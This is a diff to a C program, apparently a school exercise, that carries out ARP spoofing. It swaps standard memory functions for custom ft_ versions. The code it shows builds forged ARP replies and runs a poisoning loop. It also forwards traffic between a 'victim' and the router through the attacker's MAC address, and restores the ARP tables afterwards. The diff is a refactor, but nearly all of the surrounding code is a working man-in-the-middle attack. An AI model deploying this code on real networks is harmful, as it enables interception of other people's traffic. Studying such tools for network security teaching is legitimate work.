@@ -86,12 +86,12 @@ static int send_data(int sock, int index, void *data, size_t len, unsigned char 
 {
 	struct sockaddr_ll sll;
 
-	memset(&sll, 0, sizeof(sll));
+	ft_memset(&sll, 0, sizeof(sll));
 	sll.sll_family = AF_PACKET;      
 	sll.sll_ifindex = index;     
 	sll.sll_halen = ETH_ALEN; 
 
-	memcpy(sll.sll_addr, dest_mac, ETH_ALEN);
+	ft_memcpy(sll.sll_addr, dest_mac, ETH_ALEN);
 
 	if (sendto(sock, data, len, 0, (struct sockaddr *)&sll, sizeof(sll)) < 0) 
 		return (0);
@@ -101,8 +101,8 @@ static int send_data(int sock, int index, void *data, size_t len, unsigned char 
 static void fill_arp_request(t_session session, struct arp_packet *pkt, int protocol)
 {
 	//Ethernet header	
-	memset(pkt->eth.h_dest, 0xff, 6);          		// Destino: Broadcast (ff:ff:ff:ff:ff:ff)
-	memcpy(pkt->eth.h_source, session.src.mac, 6);   // Origen: MAC
+	ft_memset(pkt->eth.h_dest, 0xff, 6);          		// Destino: Broadcast (ff:ff:ff:ff:ff:ff)
+	ft_memcpy(pkt->eth.h_source, session.src.mac, 6);   // Origen: MAC
 	pkt->eth.h_proto = htons(ETH_P_ARP);			// Tipo: ARP (0x0806)
 
 	//Body ARP
@@ -113,10 +113,10 @@ static void fill_arp_request(t_session session, struct arp_packet *pkt, int prot
 	pkt->arp.ea_hdr.ar_op = htons(protocol); // Operación: REQUEST | REPLY
 
 	//Directions inside body ARP
-	memcpy(pkt->arp.arp_sha, session.src.mac, 6);           // Sender MAC
-	memcpy(pkt->arp.arp_spa, &session.src.ip.s_addr, 4);    // Sender IP
-	memcpy(pkt->arp.arp_tha, session.dst.mac, 6);  	       // Target MAC 
-	memcpy(pkt->arp.arp_tpa, &session.dst.ip.s_addr, 4);    // Target IP 
+	ft_memcpy(pkt->arp.arp_sha, session.src.mac, 6);           // Sender MAC
+	ft_memcpy(pkt->arp.arp_spa, &session.src.ip.s_addr, 4);    // Sender IP
+	ft_memcpy(pkt->arp.arp_tha, session.dst.mac, 6);  	       // Target MAC 
+	ft_memcpy(pkt->arp.arp_tpa, &session.dst.ip.s_addr, 4);    // Target IP 
 }
 
 static unsigned char *receive_arp_response(int socket)
@@ -147,9 +147,9 @@ static void get_access_point_mac(int socket, unsigned int *index, t_session sess
 	char *name = get_nic(ifaddr);
 	*index = if_nametoindex(name);           
 	first.src.ip = session.dst.ip;
-	memcpy(first.src.mac, session.dst.mac, 6);
+	ft_memcpy(first.src.mac, session.dst.mac, 6);
 	first.dst.ip = session.src.ip;
-	memset(first.dst.mac, 0, 6);
+	ft_memset(first.dst.mac, 0, 6);
 			//session -> src -> ip victim  
 			//session -> src -> mac attacker 
 			//session -> dst -> ip router  
@@ -162,7 +162,7 @@ static void get_access_point_mac(int socket, unsigned int *index, t_session sess
 	}
 	temp_mac = receive_arp_response(socket);
 	if (temp_mac)
-    	memcpy(access_point->mac, temp_mac, 6);
+    	ft_memcpy(access_point->mac, temp_mac, 6);
 	else 
 	{
 		cleaning(socket, ifaddr);
@@ -176,7 +176,7 @@ static void arp_restore(int sock, int index, t_session session, t_pair access_po
 	struct arp_packet router_packet;
 	struct arp_packet victim_packet;
 	
-	memcpy(session.src.mac, access_point.mac, 6);
+	ft_memcpy(session.src.mac, access_point.mac, 6);
 	//RESTORE ROUTER 
 	//session -> src -> ip victim  
 	//session -> src -> mac victim 
@@ -186,9 +186,9 @@ static void arp_restore(int sock, int index, t_session session, t_pair access_po
 	send_data(sock, index, &victim_packet, sizeof(struct arp_packet), session.dst.mac);
 
 	router_session.src.ip = session.dst.ip;
-	memcpy(router_session.src.mac, session.dst.mac, 6);
+	ft_memcpy(router_session.src.mac, session.dst.mac, 6);
 	router_session.dst.ip = session.src.ip;
-	memcpy(router_session.dst.mac, session.src.mac, 6);
+	ft_memcpy(router_session.dst.mac, session.src.mac, 6);
 	//RESTORE VICTIM 
 	//router_session -> src -> ip router  
 	//router_session -> src -> mac router 
@@ -202,22 +202,21 @@ static void forwarding(int sock, int index, unsigned char *buffer, ssize_t bytes
 {
 	struct ethhdr *eth = (struct ethhdr *)buffer;
 	struct sockaddr_ll socket_address;
-
-	if (memcmp(eth->h_dest, session.src.mac, 6) == 0) 
-		{
-			//SERVER->VICTIM
-			if (memcmp(eth->h_source, session.dst.mac, 6) == 0) {
-				memcpy(eth->h_source, session.src.mac, 6); // MAC attacker
-				memcpy(eth->h_dest, victim.mac, 6);      // MAC victim 
-			}
-			//VICTIM->SERVER
-			else if (memcmp(eth->h_source, victim.mac, 6) == 0) {
-				memcpy(eth->h_source, session.src.mac, 6); //MAC attacker 
-				memcpy(eth->h_dest, session.dst.mac, 6);   //MAC router 
-			}
-			memcpy(socket_address.sll_addr, eth->h_dest, 6);
-			send_data(sock, index, buffer, bytes, eth->h_dest);
+	if (ft_memcmp(eth->h_dest, session.src.mac, 6) == 0)
+	{
+		//SERVER->VICTIM
+		if (ft_memcmp(eth->h_source, session.dst.mac, 6) == 0) {
+			ft_memcpy(eth->h_source, session.src.mac, 6); // MAC attacker
+			ft_memcpy(eth->h_dest, victim.mac, 6);      // MAC victim 
 		}
+		//VICTIM->SERVER
+		else if (ft_memcmp(eth->h_source, victim.mac, 6) == 0) {
+			ft_memcpy(eth->h_source, session.src.mac, 6); //MAC attacker 
+			ft_memcpy(eth->h_dest, session.dst.mac, 6);   //MAC router 
+		}
+		ft_memcpy(socket_address.sll_addr, eth->h_dest, 6);
+		send_data(sock, index, buffer, bytes, eth->h_dest);
+	}
 }
 
 static void snoop_payload(unsigned char *buffer, struct iphdr *ip, ssize_t bytes)
@@ -250,7 +249,7 @@ static void poisoning(int sock, int index, t_session session, t_pair access_poin
 	router_session.src.ip = session.dst.ip;
 	router_session.dst.ip = session.src.ip;
 
-	memcpy(router_session.dst.mac, access_point.mac, 6);
+	ft_memcpy(router_session.dst.mac, access_point.mac, 6);
 
 	while(loop)
 	{
